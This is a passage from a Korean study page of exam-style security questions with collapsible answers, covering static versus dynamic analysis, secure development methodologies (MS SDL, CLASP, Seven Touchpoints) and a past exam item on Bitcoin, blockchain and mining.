<strong>정답:</strong> <strong>코드 오류</strong>
</blockquote>
</details>

<details>
<summary>[590] (서술형) 소프트웨어 개발보안 진단 도구 중 **정적 분석(Static Analysis)**과 **동적 분석(Dynamic Analysis)**의 차이점을 분석 시점과 대상 측면에서 설명하시오.</summary>
<blockquote>
<strong>정적 분석</strong>: 프로그램을 실행하지 않고 소스코드 자체를 분석하여 설계나 구현 단계의 결함을 찾아내는 방식이다.<br>
<strong>동적 분석</strong>: 프로그램을 실제로 실행한 상태에서 입력값에 대한 출력 결과나 메모리 상태 등을 모니터링하여 런타임에 발생하는 취약점을 찾아내는 방식이다.
</blockquote>
</details>

<details>
<summary>[591] (단답형) 보안 강화를 위해 기존의 SDLC(Software Development Life Cycle)에 보안 활동을 추가한 모델로, 마이크로소프트(MS)에서 제안하여 널리 사용되는 보안 개발 방법론의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>MS SDL</strong> (Security Development Lifecycle)
</blockquote>
</details>

<details>
<summary>[592] (서술형) 소프트웨어 개발보안 방법론 중 **CLASP**의 특징을 5가지 관점(View)을 중심으로 간단히 설명하시오.</summary>
<blockquote>
<strong>특징</strong>: SDLC 초기 단계에서의 보안 강화를 목적으로 하며, 총 5가지 관점(개념, 역할, 활동, 자원, 결함)에 따라 체계적인 보안 활동 세트를 제공한다.
</blockquote>
</details>

<details>
<summary>[593] (단답형) 소프트웨어 개발보안 방법론 중 하나로, 실무적으로 검증된 보안 강화 활동을 7가지 핵심 요소(코드 검토, 외부 인터페이스 분석 등)로 정의한 방법론의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Seven Touchpoints</strong>
</blockquote>
</details>

<details>
<summary>[기출 20회 7번 문제] (단답형) 분산 원장 기술인 (B)를 거래 기록 저장소로 이용하며, 사토시 나카모토가 개발한 가상화폐 (A)와 Hash 연산을 통해 거래를 증명하고 이에 대한 대가를 받는 행위 (C)를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>비트코인 (Bitcoin)</strong>, (B) <strong>블록체인 (Blockchain)</strong>, (C) <strong>채굴 (Mining)</strong>
</blockquote>
</details>
